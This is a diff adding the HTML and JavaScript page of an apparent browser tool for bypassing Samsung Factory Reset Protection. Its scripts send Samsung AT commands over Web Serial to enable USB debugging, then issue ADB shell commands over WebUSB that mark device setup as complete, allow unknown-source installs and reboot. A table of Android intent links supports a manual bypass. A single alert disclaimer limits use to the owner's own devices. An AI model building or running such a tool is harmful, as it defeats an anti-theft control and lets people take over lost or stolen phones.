@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="webadb.js"></script>
+    <title>Samsung FRP Bypass from the Browser | Sudo-Self</title>
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(45deg, #1e293b, #0f172a);
+            font-family: "Segoe UI", "Roboto", sans-serif;
+            color: #e5e7eb;
+            margin: 0;
+            padding: 0;
+        }
+        .log {
+            background-color: #111827;
+            color: #10b981;
+            font-family: "Courier New", monospace;
+            padding: 10px;
+            border: 2px dashed #3b82f6;
+            height: 200px;
+            overflow-y: scroll;
+            box-shadow: inset 2px 2px 0px #000;
+        }
+        .notice {
+            color: #f87171;
+            cursor: pointer;
+            font-size: 1.2em;
+        }
+        h1, h3 {
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.6);
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #3b82f6, #9333ea);
+            color: #fff;
+            font-weight: 600;
+            padding: 12px 30px;
+            border-radius: 8px;
+            transition: 0.3s;
+        }
+        .btn-primary:hover {
+            background: linear-gradient(135deg, #9333ea, #3b82f6);
+            transform: scale(1.05);
+        }
+        .btn-secondary {
+            background: #3b82f6;
+            color: #fff;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-weight: 600;
+            transition: 0.3s;
+        }
+        .btn-secondary:hover {
+            background: #2563eb;
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-r from-gray-800 to-black">
+
+    <div class="text-center p-6">
+        <h3 class="text-4xl text-white font-bold">Samsung FRP Bypass</h3><br />
+        <a class="github-button" href="https://github.com/sudo-self/samsung-frp-browser" data-color-scheme="no-preference: light; light: light; dark: light;" data-icon="octicon-star" data-size="large" aria-label="Star sudo-self/samsung-frp-browser on GitHub">Star</a>
+      
+    </div>
+
+    <!-- First Container -->
+    <div class="container mx-auto p-6 bg-gray-900 rounded-lg shadow-lg mb-8">
+        <h1 class="text-3xl text-purple-400 font-extrabold mb-4">Enable USB Debugging</h1>
+
+        <div class="flex justify-center mb-4">
+            <button id="connectButton" class="btn-primary">
+                Connect Device USB
+            </button>
+        </div>
+
+        <div class="flex justify-center mb-4">
+            <button onclick="sendAllCommands()" class="btn-secondary">
+                Enable
+            </button>
+        </div>
+
+        <h3 class="text-xl text-gray-300 font-bold">No read try another USB port</h3>
+        <div id="log" class="log"></div>
+    </div>
+
+ 
+    <div class="container mx-auto p-6 bg-gray-900 rounded-lg shadow-lg mb-8">
+        <h1 class="text-3xl text-purple-400 font-extrabold mb-4">Bypass FRP Lock</h1>
+
+        <div class="flex justify-center mb-4">
+            <button id="connectToPhone" class="btn-primary">
+                Connect
+            </button>
+        </div>
+
+        <div class="flex justify-center mb-4">
+            <button onclick="sendAllCommandsAdb()" class="btn-secondary">
+                Bypass
+            </button>
+        </div>
+
+        <h3 class="text-xl text-gray-300 font-bold">ADB Commands</h3>
+        <div id="logadb" class="log"></div>
+    </div>
+
+    <!-- Notice and Link -->
+    <div class="container mx-auto p-6 text-center bg-gray-900 rounded-lg shadow-lg">
+        <p class="text-2xl text-pink-500 font-bold mb-4"><a href="https://vnrom.net/bypass/" target="_blank" class="text-pink-400 hover:underline">BYPASS LINKS</a></p>
+        <center><img src="giphy.gif" width="200px" hieght="auto"></img></center>
+        <p class="notice mb-4" onclick="alert('This is for educational and research purposes only. do not use this on devices that are not your own. Data loss is likely so backup your stuff before you proceed. I am not liable for any kind of damage you cause with this tool.')">
+            Disclaimer!
+        </p>
+    </div>
+    <!-- Links Section (Bottom Container) -->
+    <div class="container mx-auto p-6 bg-gray-900 rounded-lg shadow-lg mb-8 link-container">
+        <h2 class="text-2xl text-white font-bold mb-4">Device Operations</h2>
+        <table class="table-auto w-full">
+            <tbody>
+                <!-- Android Settings -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Android Settings</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.android.settings/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Galaxy Apps -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Galaxy Apps</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.sec.android.app.samsungapps/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Galaxy Store -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Galaxy Store</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="https://www.samsung.com/uk/apps/galaxy-store/" target="_blank" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Set Pattern Lock -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Set Pattern Lock</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.google.android.gms/#Intent;scheme=promote_smartlock_scheme;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Google Search -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Google Search</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.google.android.googlequicksearchbox/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- APP Store -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">APP Store</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="https://apps.samsung.com/appquery/appDetail.as?appId=com.rrivenllc.shieldx" target="_blank" class="text-red-500 hover:underline">INSTALL</a>
+                    </td>
+                </tr>
+                <!-- Alliance Shield X -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Alliance Shield X</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.rrivenllc.shieldx/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Gmail APP -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">GMAIL APP</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.google.android.gm/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Chrome APP -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Chrome APP</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.android.chrome/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Youtube APP -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Youtube APP</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.google.android.youtube/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Files App -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Files App</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.sec.android.app.myfiles/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Google Maps -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Google Maps</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.google.android.apps.maps/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Touch ID -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Touch ID</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="intent://com.android.settings/com.samsung.android.settings.biometrics.fingerprint.FingerprintEntry/#Intent;scheme=android-app;end" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Call Dialer -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Call Dialer</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="tel:112" target="_blank" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+                <!-- Google Settings -->
+                <tr>
+                    <td class="w-3/4 py-2 text-left text-white">Google Settings</td>
+                    <td class="w-1/4 py-2 text-right">
+                        <a href="https://apps.samsung.com/appquery/appDetail.as?appld=com.jami.tool.play.services.hidden.settings" target="_blank" class="text-red-500 hover:underline">OPEN</a>
+                    </td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        let port = null;
+        let reader = null;
+        let writer = null;
+        var readableStreamClosed = null;
+        var writableStreamClosed = null;
+        var commands = [
+            'AT+KSTRINGB=0,3\r\n',
+            'AT+DUMPCTRL=1,0\r\n',
+            'AT+DEBUGLVC=0,5\r\n',
+            'AT+SWATD=0\r\n',
+            'AT+ACTIVATE=0,0,0\r\n',
+            'AT+SWATD=1\r\n'
+        ];
+
+        async function sendAllCommands() {
+            for (let i = 0; i < commands.length; i++) {
+                await sendCommand(commands[i]);
+                await waitForResponse();
+            }
+        }
+
+        async function waitForResponse() {
+            return new Promise(resolve => {
+                const interval = setInterval(() => {
+                    if (lastReceivedResponse) {
+                        clearInterval(interval);
+                        lastReceivedResponse = null;
+                        resolve();
+                    }
+                }, 100);
+            });
+        }
+
+        async function connectSerial() {
+            try {
+                port = await navigator.serial.requestPort();
+                await port.open({
+                    baudRate: 115200
+                });
+
+                const textDecoder = new TextDecoderStream();
+                readableStreamClosed = port.readable.pipeTo(textDecoder.writable);
+                const textEncoder = new TextEncoderStream();
+                writableStreamClosed = textEncoder.readable.pipeTo(port.writable);
+
+                reader = textDecoder.readable.getReader();
+                writer = textEncoder.writable.getWriter();
+
+                log('Connected to serial port');
+                document.getElementById('connectButton').textContent = 'Disconnect';
+                readLoop();
+            } catch (err) {
+                log('Error: ' + err.message);
+            }
+        }
+
+        let lastReceivedResponse = null;
+
+        async function readLoop() {
+            try {
+                while (true) {
+                    const { value, done } = await reader.read();
+                    if (done) {
+                        reader.releaseLock();
+                        break;
+                    }
+                    log('Received: ' + value);
+                    lastReceivedResponse = value.trim();
+                }
+            } catch (err) {
+                log('Error in read loop: ' + err.message);
+            }
+        }
+
+        async function sendCommand(command) {
+            if (!writer) {
+                log('Not connected to any serial port');
+                return;
+            }
+
+            try {
+                log('Sending: ' + command);
+                await writer.write(command);
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (err) {
+                log('Error sending command: ' + err.message);
+            }
+        }
+
+        function log(message) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += message + '<br>';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        document.getElementById('connectButton').addEventListener('click', async () => {
+            if (port) {
+                try {
+                    if (reader) {
+                        await reader.cancel();
+                        await readableStreamClosed.catch(() => { /* Ignore the error */ });
+                    }
+                    if (writer) {
+                        await writer.close();
+                        await writableStreamClosed;
+                    }
+                    await port.close();
+                    port = null;
+                    document.getElementById('connectButton').textContent = 'Connect to Serial Port';
+                    log('Disconnected from serial port');
+                } catch (err) {
+                    log('Error disconnecting: ' + err.message);
+                }
+            } else {
+                connectSerial();
+            }
+        });
+    </script>
+
+    <script>
+        function logadb(message) {
+            const logDiv = document.getElementById('logadb');
+            logDiv.innerHTML += message + '<br>';
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        let adb;
+        var commandsAdb =[
+            'settings put global setup_wizard_has_run 1',
+            'settings put secure user_setup_complete 1',
+            'content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1',
+            'content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1',
+            'content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1',
+            'am start -c android.intent.category.HOME -a android.intent.action.MAIN',
+            'am start -n com.android.settings/com.android.settings.Settings',
+            'reboot'
+        ];
+
+        async function init() {
+            while (true) {
+                try {
+                    let webusb = await Adb.open("WebUSB");
+                    adb = await webusb.connectAdb("host::");
+                    logadb("Connected to phone!")
+                    break;
+                } catch (error) {
+                    if (error.message.includes("host::")) {
+                        alert("Failed to connect for the first time!\nPress OK to try again")
+                        console.log(`Retrying...`);
+                        continue;
+                    }
+                    else {
+                        throw error;
+                    }
+                }
+            }
+        }
+
+        window.addEventListener('unload', async () => {
+            webusb.close();
+        });
+
+        async function sendCommandAdb(command, index) {
+            try {
+                await adb.shell(command);
+                logadb(`[${index+1}/8] OK`);
+            } catch (error) {
+                console.error("Command failed:", error);
+            }
+        }
+
+        async function sendAllCommandsAdb() {
+            for (let i = 0; i < commandsAdb.length; i++) {
+                await sendCommandAdb(commandsAdb[i], i);
+                await delay(2000);
+            }
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        let cnt_btn = document.getElementById("connectToPhone");
+        cnt_btn.addEventListener('click', function () {
+            init().catch(console.error);
+        });
+    </script>
+    <!-- Footer -->
+    <footer class="bg-gray-900 text-gray-400 p-4 mt-8">
+        <div class="text-center">
+            <p class="text-sm">
+                Samsung FRP Browser&nbsp;&copy;Sudo-Self.
+            </p>
+            <p class="text-sm">
+                <a href="https://github.com/sudo-self/samsung-frp-browser" class="text-blue-500 hover:underline" target="_blank">Source Code</a>
+            </p>
+            <p class="text-sm mt-2">
+                <a href="https://frp.jessejesse.xyz" class="text-blue-500 hover:underline" target="_blank">Samsung FRP</a>
+            </p>
+        </div>
+    </footer>
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+</body>
+</html>
+
+
